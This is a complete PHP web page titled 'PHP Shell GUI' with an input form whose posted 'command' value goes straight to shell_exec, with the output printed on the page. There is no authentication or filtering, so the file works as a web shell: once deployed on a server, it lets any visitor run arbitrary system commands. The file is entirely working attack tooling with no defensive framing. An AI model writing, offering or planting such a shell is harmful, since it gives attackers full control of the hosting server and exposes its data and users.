<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell GUI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        #output {
            width: 80%;
            height: 300px;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 10px;
            overflow: auto;
        }
        #input {
            width: 80%;
            padding: 5px;
        }
        #submit {
            padding: 5px 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>PHP Shell GUI</h2>
    <div id="output"></div>
    <form method="post">
        <input type="text" name="command" id="input" placeholder="Enter a command...">
        <input type="submit" value="Submit" id="submit">
    </form>
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST['command'];
        if ($command) {
            echo "<h3>Command Output:</h3>";
            echo "<pre>";
            echo shell_exec($command);
            echo "</pre>";
        } else {
            echo "<p>Please enter a command.</p>";
        }
    }
    ?>
</body>
</html>
